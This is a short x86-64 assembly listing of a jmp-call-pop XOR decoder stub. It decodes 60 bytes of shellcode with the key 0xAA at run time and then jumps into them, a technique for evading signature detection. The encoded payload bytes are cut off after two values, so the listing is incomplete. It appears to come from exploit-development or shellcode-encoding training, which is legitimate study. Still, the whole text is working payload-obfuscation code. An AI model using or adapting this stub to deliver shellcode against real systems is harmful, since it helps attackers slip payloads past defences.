global _start

section .text

_start:
      jmp find_address

decoder:
      pop rdi
      xor rcx, rcx
      add cl, 60   ; length of  shellcode


decode:
      xor byte [rdi], 0xAA
      inc rdi
      loop decode

      jmp short encoded_shellcode




find_address:
      call decoder


      encoded_shellcode:  db 0x41, 0xb7 .....
